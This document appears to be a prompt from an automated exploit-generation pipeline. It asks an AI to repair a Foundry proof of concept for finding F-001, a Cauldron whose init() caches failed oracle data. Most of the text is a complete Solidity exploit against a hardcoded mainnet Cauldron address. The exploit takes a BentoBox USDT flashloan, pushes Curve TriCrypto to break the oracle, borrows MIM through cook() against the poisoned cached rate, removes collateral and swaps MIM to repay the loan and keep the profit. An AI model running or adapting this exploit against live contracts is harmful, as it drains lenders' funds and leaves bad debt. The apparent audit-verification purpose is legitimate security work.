You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initialization accepts failed oracle data and can seed an invalid exchange-rate cache
- claim: `init()` ignores the `success` flag from `oracle.get()` and caches whatever rate is returned, including `0` or stale garbage. If the market is initialized while the oracle has no valid price, later failed `updateExchangeRate()` calls keep reusing that poisoned cache for solvency checks and liquidations.
- impact: A Cauldron can start life with a zero or severely understated exchange rate, making bad debt appear solvent. Borrowers can then overborrow or remove too much collateral up to the available MIM / borrow cap until a successful oracle update finally replaces the cached rate, leaving the market with bad debt or undercollateralized positions.
- exploit_paths: ["Initialize the clone while `oracle.get(oracleData)` returns `(false, 0)` or another invalid quote.", "Let later `updateExchangeRate()` calls keep returning `success = false`, so the cached initialization value remains active.", "Call `borrow()` or `cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...)`; `_isSolvent()` uses the poisoned cached rate and allows positions that should fail solvency checks."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function peek(bytes calldata data) external view returns (bool success, uint256 rate);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function deposit(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function flashLoan(
        address borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICauldronV4Like {
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function bentoBox() external view returns (address);
    function magicInternetMoney() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function COLLATERIZATION_RATE() external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function userBorrowPart(address user) external view returns (uint256);
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

interface IYearnVaultLike {
    function token() external view returns (address);
    function pricePerShare() external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x7259e152103756e1616A77Ae982353c3751A6a90;

    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address internal constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant TRICRYPTO_POOL = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;

    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _pathUsed;
    uint256 private _startingProfitBalance;
    uint256 private _cachedRate;
    bool private _flashLoanInFlight;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        _profitToken = cauldron.magicInternetMoney();
        _startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        if (_profitToken != MIM) {
            _pathUsed = "infeasible_unexpected_profit_token";
            _finalize();
            return;
        }

        address collateralToken = cauldron.collateral();
        if (collateralToken == address(0)) {
            _pathUsed = "infeasible_uninitialized_target";
            _finalize();
            return;
        }

        if (!_supportsYearnTriCryptoRoute(collateralToken)) {
            _pathUsed = "infeasible_collateral_route_not_supported";
            _finalize();
            return;
        }

        _cachedRate = cauldron.exchangeRate();
        {
            bytes memory oracleData = cauldron.oracleData();
            try IOracleLike(cauldron.oracle()).peek(oracleData) returns (bool success, uint256 rate) {
                if (success && rate != 0 && _cachedRate >= rate) {
                    _pathUsed = "infeasible_cached_rate_not_understated";
                    _finalize();
                    return;
                }
            } catch {}
        }

        uint256 availableMimShare = IBentoBoxLike(cauldron.bentoBox()).balanceOf(MIM, TARGET);
        uint256 availableMimAmount = IBentoBoxLike(cauldron.bentoBox()).toAmount(MIM, availableMimShare, false);
        uint256 borrowCap = _maxBorrowable(cauldron, availableMimAmount);
        if (borrowCap <= 1e15) {
            _pathUsed = "infeasible_no_borrow_capacity";
            _finalize();
            return;
        }

        uint256[8] memory loans = [
            uint256(100_000e6),
            250_000e6,
            500_000e6,
            1_000_000e6,
            2_000_000e6,
            4_000_000e6,
            6_000_000e6,
            8_000_000e6
        ];
        uint256[4] memory manipBps = [uint256(2500), 5000, 7500, 9000];

        for (uint256 i = 0; i < loans.length && !_hypothesisValidated; i++) {
            for (uint256 j = 0; j < manipBps.length && !_hypothesisValidated; j++) {
                try this.attemptUsdtPlan(loans[i], manipBps[j], 1) {} catch {}
                if (_hypothesisValidated) {
                    break;
                }
                try this.attemptUsdtPlan(loans[i], manipBps[j], 2) {} catch {}
            }
        }

        if (!_hypothesisValidated && bytes(_pathUsed).length == 0) {
            _pathUsed = "infeasible_all_public_liquidity_plans_failed";
        }
        _finalize();
    }

    function attemptUsdtPlan(uint256 flashAmount, uint256 manipulateBps, uint8 buyIndex) external {
        require(msg.sender == address(this), "self only");
        require(buyIndex == 1 || buyIndex == 2, "bad coin");

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        address bento = cauldron.bentoBox();
        bytes memory data = abi.encode(flashAmount, manipulateBps, buyIndex);
        _flashLoanInFlight = true;
        IBentoBoxLike(bento).flashLoan(address(this), address(this), USDT, flashAmount, data);
        _flashLoanInFlight = false;

        require(_hypothesisValidated, "plan failed");
    }

    function onFlashLoan(
        address sender,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {
        require(_flashLoanInFlight, "flash not expected");
        require(sender == address(this), "bad sender");
        require(token == USDT, "bad token");

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        require(msg.sender == cauldron.bentoBox(), "bad lender");

        (uint256 flashAmount, uint256 manipulateBps, uint8 buyIndex) = abi.decode(data, (uint256, uint256, uint8));
        require(flashAmount == amount, "amount mismatch");
        _executeUsdtFlashPlan(cauldron, amount, fee, manipulateBps, buyIndex, msg.sender);
    }

    function _executeUsdtFlashPlan(
        ICauldronV4Like cauldron,
        uint256 amount,
        uint256 fee,
        uint256 manipulateBps,
        uint8 buyIndex,
        address lender
    ) internal {
        address collateralToken = cauldron.collateral();
        require(IYearnVaultLike(collateralToken).token() == TRICRYPTO_POOL, "unexpected underlying");

        uint256 manipulateAmount = (amount * manipulateBps) / BPS;
        uint256 seedAmount = amount - manipulateAmount;
        require(manipulateAmount != 0 && seedAmount != 0, "bad split");

        // The finding's causality stays the same:
        // 1. The Cauldron keeps an init-time poisoned cached exchangeRate.
        // 2. We use public Curve liquidity to push the oracle path into a failing state.
        // 3. cook(ADD_COLLATERAL, BORROW, REMOVE_COLLATERAL) then reuses the poisoned cache
        //    during the end-of-cook solvency check because updateExchangeRate() fails.
        uint256 manipulatedAssetOut = _curveExchangeUsdtTo(buyIndex, manipulateAmount);
        require(manipulatedAssetOut != 0, "curve manipulation failed");

        uint256 lpAmount = _mintTriCryptoLp(seedAmount);
        require(lpAmount != 0, "no lp");

        uint256 vaultShares = _depositYearn(collateralToken, lpAmount);
        require(vaultShares != 0, "no vault shares");

        uint256 removedShare = _depositAndCook(cauldron, collateralToken, vaultShares);
        _unwindCollateralAndManipulation(cauldron, collateralToken, removedShare, buyIndex);
        _repayUsdtFlashloan(amount + fee, lender);
        require(IERC20Like(MIM).balanceOf(address(this)) > _startingProfitBalance, "no realized mim profit");

        _hypothesisValidated = true;
        _pathUsed =
            "init_poisoned_cache_then_curve_oracle_failure_then_cook_add_collateral_borrow_remove_collateral";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function pathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function _depositAndCook(
        ICauldronV4Like cauldron,
        address collateralToken,
        uint256 collateralAmount
    ) internal returns (uint256 removedShare) {
        address bento = cauldron.bentoBox();

        _forceApprove(collateralToken, bento, collateralAmount);
        (, uint256 shareOut) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET, collateralAmount, 0);
        require(shareOut != 0, "no collateral share");

        uint256 availableMimShare = IBentoBoxLike(bento).balanceOf(MIM, TARGET);
        uint256 availableMimAmount = IBentoBoxLike(bento).toAmount(MIM, availableMimShare, false);
        uint256 borrowCap = _maxBorrowable(cauldron, availableMimAmount);
        require(borrowCap != 0, "no borrow cap");

        uint256 borrowAmount = _maxBorrowSupportedByShare(cauldron, _cachedRate, shareOut, borrowCap);
        if (borrowAmount > 1) {
            uint256 haircut = (borrowAmount / 1000) + 1;
            borrowAmount = haircut < borrowAmount ? borrowAmount - haircut : borrowAmount;
        }
        require(borrowAmount != 0, "no borrow");

        uint256 keepShare = _requiredKeepShareForBorrow(cauldron, _cachedRate, borrowAmount);
        require(shareOut > keepShare, "no removable share");
        removedShare = shareOut - keepShare;

        uint8[] memory actions = new uint8[](3);
        actions[0] = ACTION_ADD_COLLATERAL;
        actions[1] = ACTION_BORROW;
        actions[2] = ACTION_REMOVE_COLLATERAL;

        uint256[] memory values = new uint256[](3);

        bytes[] memory datas = new bytes[](3);
        datas[0] = abi.encode(_toInt256(shareOut), address(this), true);
        datas[1] = abi.encode(_toInt256(borrowAmount), address(this));
        datas[2] = abi.encode(_toInt256(removedShare), address(this));

        cauldron.cook(actions, values, datas);
    }

    function _unwindCollateralAndManipulation(
        ICauldronV4Like cauldron,
        address collateralToken,
        uint256 removedShare,
        uint8 buyIndex
    ) internal {
        _withdrawAllFromBento(MIM);

        if (removedShare != 0) {
            IBentoBoxLike(cauldron.bentoBox()).withdraw(collateralToken, address(this), address(this), 0, removedShare);
        }

        uint256 looseVaultShares = IERC20Like(collateralToken).balanceOf(address(this));
        if (looseVaultShares != 0) {
            uint256 looseLp = _withdrawYearn(collateralToken, looseVaultShares);
            if (looseLp != 0) {
                _removeTriCryptoOneCoinUsdt(looseLp);
            }
        }

        _curveExchangeBackToUsdt(buyIndex);
    }

    function _repayUsdtFlashloan(uint256 repayAmount, address lender) internal {
        uint256 usdtBalance = IERC20Like(USDT).balanceOf(address(this));
        if (usdtBalance < repayAmount) {
            _swapMimForUsdt(repayAmount - usdtBalance);
            usdtBalance = IERC20Like(USDT).balanceOf(address(this));
        }
        require(usdtBalance >= repayAmount, "insufficient usdt repay");
        _safeTransfer(USDT, lender, repayAmount);
    }

    function _supportsYearnTriCryptoRoute(address collateralToken) internal view returns (bool) {
        try IYearnVaultLike(collateralToken).token() returns (address underlying) {
            if (underlying != TRICRYPTO_POOL) {
                return false;
            }
        } catch {
            return false;
        }

        try IYearnVaultLike(collateralToken).pricePerShare() returns (uint256 pps) {
            return pps != 0;
        } catch {
            return false;
        }
    }

    function _mintTriCryptoLp(uint256 usdtAmount) internal returns (uint256 lpMinted) {
        if (usdtAmount == 0) {
            return 0;
        }

        _forceApprove(USDT, TRICRYPTO_POOL, usdtAmount);
        uint256[3] memory amounts;
        amounts[0] = usdtAmount;

        uint256 beforeBalance = IERC20Like(TRICRYPTO_POOL).balanceOf(address(this));
        bytes memory callData = abi.encodeWithSignature("add_liquidity(uint256[3],uint256)", amounts, 1);
        (bool ok,) = TRICRYPTO_POOL.call(callData);
        require(ok, "curve add liquidity failed");
        lpMinted = IERC20Like(TRICRYPTO_POOL).balanceOf(address(this)) - beforeBalance;
    }

    function _removeTriCryptoOneCoinUsdt(uint256 lpAmount) internal returns (uint256 usdtOut) {
        if (lpAmount == 0) {
            return 0;
        }

        _forceApprove(TRICRYPTO_POOL, TRICRYPTO_POOL, lpAmount);
        uint256 beforeBalance = IERC20Like(USDT).balanceOf(address(this));

        bytes memory callData = abi.encodeWithSignature(
            "remove_liquidity_one_coin(uint256,uint256,uint256)",
            lpAmount,
            uint256(0),
            uint256(1)
        );
        (bool ok,) = TRICRYPTO_POOL.call(callData);
        if (!ok) {
            callData = abi.encodeWithSignature(
                "remove_liquidity_one_coin(uint256,int128,uint256)",
                lpAmount,
                int128(0),
                uint256(1)
            );
            (ok,) = TRICRYPTO_POOL.call(callData);
        }
        require(ok, "curve remove liquidity failed");
        usdtOut = IERC20Like(USDT).balanceOf(address(this)) - beforeBalance;
    }

    function _curveExchangeUsdtTo(uint8 buyIndex, uint256 amountIn) internal returns (uint256 amountOut) {
        address outToken = buyIndex == 1 ? WBTC : WETH;
        _forceApprove(USDT, TRICRYPTO_POOL, amountIn);
        uint256 beforeBalance = IERC20Like(outToken).balanceOf(address(this));

        bytes memory callData = abi.encodeWithSignature(
            "exchange(uint256,uint256,uint256,uint256)",
            uint256(0),
            uint256(buyIndex),
            amountIn,
            uint256(1)
        );
        (bool ok,) = TRICRYPTO_POOL.call(callData);
        if (!ok) {
            callData = abi.encodeWithSignature(
                "exchange(int128,int128,uint256,uint256)",
                int128(0),
                int128(uint128(buyIndex)),
                amountIn,
                uint256(1)
            );
            (ok,) = TRICRYPTO_POOL.call(callData);
        }
        require(ok, "curve exchange failed");
        amountOut = IERC20Like(outToken).balanceOf(address(this)) - beforeBalance;
    }

    function _curveExchangeBackToUsdt(uint8 soldIndex) internal returns (uint256 amountOut) {
        address sellToken = soldIndex == 1 ? WBTC : WETH;
        uint256 amountIn = IERC20Like(sellToken).balanceOf(address(this));
        if (amountIn == 0) {
            return 0;
        }

        _forceApprove(sellToken, TRICRYPTO_POOL, amountIn);
        uint256 beforeBalance = IERC20Like(USDT).balanceOf(address(this));

        bytes memory callData = abi.encodeWithSignature(
            "exchange(uint256,uint256,uint256,uint256)",
            uint256(soldIndex),
            uint256(0),
            amountIn,
            uint256(1)
        );
        (bool ok,) = TRICRYPTO_POOL.call(callData);
        if (!ok) {
            callData = abi.encodeWithSignature(
                "exchange(int128,int128,uint256,uint256)",
                int128(uint128(soldIndex)),
                int128(0),
                amountIn,
                uint256(1)
            );
            (ok,) = TRICRYPTO_POOL.call(callData);
        }
        require(ok, "curve reverse exchange failed");
        amountOut = IERC20Like(USDT).balanceOf(address(this)) - beforeBalance;
    }

    function _depositYearn(address vault, uint256 lpAmount) internal returns (uint256 mintedShares) {
        _forceApprove(TRICRYPTO_POOL, vault, lpAmount);
        uint256 beforeBalance = IERC20Like(vault).balanceOf(address(this));

        bytes memory callData = abi.encodeWithSignature("deposit(uint256,address)", lpAmount, address(this));
        (bool ok,) = vault.call(callData);
        if (!ok) {
            callData = abi.encodeWithSignature("deposit(uint256)", lpAmount);
            (ok,) = vault.call(callData);
        }
        require(ok, "yearn deposit failed");
        mintedShares = IERC20Like(vault).balanceOf(address(this)) - beforeBalance;
    }

    function _withdrawYearn(address vault, uint256 vaultShares) internal returns (uint256 lpAmount) {
        uint256 beforeBalance = IERC20Like(TRICRYPTO_POOL).balanceOf(address(this));

        bytes memory callData = abi.encodeWithSignature("withdraw(uint256,address,uint256)", vaultShares, address(this), 10_000);
        (bool ok,) = vault.call(callData);
        if (!ok) {
            callData = abi.encodeWithSignature("withdraw(uint256,address)", vaultShares, address(this));
            (ok,) = vault.call(callData);
        }
        if (!ok) {
            callData = abi.encodeWithSignature("withdraw(uint256)", vaultShares);
            (ok,) = vault.call(callData);
        }
        require(ok, "yearn withdraw failed");
        lpAmount = IERC20Like(TRICRYPTO_POOL).balanceOf(address(this)) - beforeBalance;
    }

    function _swapMimForUsdt(uint256 shortfall) internal {
        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) {
            return;
        }

        uint256 amountIn = shortfall + (shortfall / 50) + 1e15;
        if (amountIn > mimBalance) {
            amountIn = mimBalance;
        }
        if (amountIn == 0) {
            return;
        }

        _forceApprove(MIM, SUSHI_ROUTER, amountIn);
        _forceApprove(MIM, UNISWAP_V2_ROUTER, amountIn);

        address[] memory direct = new address[](2);
        direct[0] = MIM;
        direct[1] = USDT;

        try IUniswapV2RouterLike(SUSHI_ROUTER).swapExactTokensForTokens(amountIn, 1, direct, address(this), block.timestamp) {
            return;
        } catch {}

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 1, direct, address(this), block.timestamp) {
            return;
        } catch {}

        address[] memory viaWeth = new address[](3);
        viaWeth[0] = MIM;
        viaWeth[1] = WETH;
        viaWeth[2] = USDT;

        try IUniswapV2RouterLike(SUSHI_ROUTER).swapExactTokensForTokens(amountIn, 1, viaWeth, address(this), block.timestamp) {
            return;
        } catch {}

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 1, viaWeth, address(this), block.timestamp);
    }

    function _withdrawAllFromBento(address token) internal {
        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        uint256 share = IBentoBoxLike(cauldron.bentoBox()).balanceOf(token, address(this));
        if (share != 0) {
            IBentoBoxLike(cauldron.bentoBox()).withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _maxBorrowSupportedByShare(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        uint256 collateralShare,
        uint256 borrowCap
    ) internal view returns (uint256) {
        if (collateralShare == 0 || borrowCap == 0) {
            return 0;
        }

        uint256 lo;
        uint256 hi = borrowCap;

        while (lo < hi) {
            uint256 mid = (lo + hi + 1) >> 1;
            uint256 keepShare = _requiredKeepShareForBorrow(cauldron, poisonedRate, mid);
            if (keepShare < collateralShare) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }

        return lo;
    }

    function _requiredKeepShareForBorrow(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        uint256 borrowAmount
    ) internal view returns (uint256) {
        if (borrowAmount == 0) {
            return 0;
        }

        (uint128 totalElastic, uint128 totalBase) = cauldron.totalBorrow();
        uint256 borrowFee = cauldron.BORROW_OPENING_FEE();
        uint256 borrowElastic = borrowAmount + ((borrowAmount * borrowFee) / BORROW_OPENING_FEE_PRECISION);

        uint256 part;
        uint256 newElastic;
        uint256 newBase;

        if (totalBase == 0) {
            part = borrowElastic;
            newElastic = borrowElastic;
            newBase = borrowElastic;
        } else {
            part = (borrowElastic * uint256(totalBase)) / uint256(totalElastic);
            if ((part * uint256(totalElastic)) / uint256(totalBase) < borrowElastic) {
                part += 1;
            }
            newElastic = uint256(totalElastic) + borrowElastic;
            newBase = uint256(totalBase) + part;
        }

        uint256 rhsCollateralAmount = (part * newElastic * poisonedRate) / newBase;
        if (rhsCollateralAmount == 0) {
            return 0;
        }

        uint256 scaledShareNeeded = _safeToShare(cauldron.bentoBox(), cauldron.collateral(), rhsCollateralAmount);
        if (scaledShareNeeded == 0 && rhsCollateralAmount != 0) {
            scaledShareNeeded = _safeToShare(cauldron.bentoBox(), cauldron.collateral(), rhsCollateralAmount + 1);
        }

        uint256 scale = 1e13 * cauldron.COLLATERIZATION_RATE();
        if (scaledShareNeeded == 0 || scale == 0) {
            return type(uint256).max;
        }

        uint256 keepShare = scaledShareNeeded / scale;
        if (keepShare * scale < scaledShareNeeded) {
            keepShare += 1;
        }
        return keepShare;
    }

    function _maxBorrowable(ICauldronV4Like cauldron, uint256 availableMimAmount) internal view returns (uint256) {
        (uint128 capTotal, uint128 capPerAddress) = cauldron.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = cauldron.totalBorrow();
        uint256 userBorrowPart = cauldron.userBorrowPart(address(this));
        uint256 borrowFee = cauldron.BORROW_OPENING_FEE();

        uint256 hi = availableMimAmount;
        uint256 lo;

        while (lo < hi) {
            uint256 mid = (lo + hi + 1) >> 1;
            uint256 feeAmount = (mid * borrowFee) / BORROW_OPENING_FEE_PRECISION;
            uint256 borrowElastic = mid + feeAmount;
            uint256 newElastic = uint256(totalElastic) + borrowElastic;

            if (newElastic > uint256(capTotal)) {
                hi = mid - 1;
                continue;
            }

            uint256 part;
            if (totalBase == 0) {
                part = borrowElastic;
            } else {
                part = (borrowElastic * uint256(totalBase)) / uint256(totalElastic);
                if ((part * uint256(totalElastic)) / uint256(totalBase) < borrowElastic) {
                    part += 1;
                }
            }

            if (userBorrowPart + part > uint256(capPerAddress)) {
                hi = mid - 1;
                continue;
            }

            lo = mid;
        }

        return lo;
    }

    function _safeToShare(address bento, address token, uint256 amount) internal view returns (uint256 shareOut) {
        try IBentoBoxLike(bento).toShare(token, amount, true) returns (uint256 share) {
            shareOut = share;
        } catch {}
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int overflow");
        // forge-lint: disable-next-line(unsafe-typecast)
        return int256(value);
    }

    function _finalize() internal {
        uint256 ending = IERC20Like(MIM).balanceOf(address(this));
        if (ending > _startingProfitBalance) {
            _profitAmount = ending - _startingProfitBalance;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 allowance = IERC20Like(token).allowance(address(this), spender);
        if (allowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length != 0) {
            require(abi.decode(returnData, (bool)), "token op failed");
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
